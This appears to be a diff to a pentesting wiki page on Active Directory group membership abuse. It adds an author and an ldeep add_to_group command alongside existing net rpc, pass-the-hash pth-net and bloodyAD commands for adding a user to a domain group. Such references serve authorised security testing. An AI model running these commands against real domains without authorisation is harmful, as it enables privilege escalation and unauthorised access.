@@ -1,5 +1,5 @@
 ---
-authors: CravateRouge, ShutdownRepo, sckdev
+authors: CravateRouge, ShutdownRepo, sckdev, 0xblank
 category: ad
 ---
 
@@ -24,10 +24,20 @@ net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWOR
 pth-net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
 ```
 
-Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+**Alternative 1**: Using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
 
 ```bash
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
+```
+
+---
+**Alternative 2**: Using [ldeep](https://github.com/franc-pentest/ldeep) (Python)
+
+> [!NOTE] NOTE
+> Use dn format for $TargetUser and $TargetGroup
+
+```bash
+ldeep ldap -d "$DOMAIN" -s "$DC_IP" -u "$USER" -p "$PASSWORD" add_to_group "$TargetUser" "$TargetGroup"
 ```
 
 
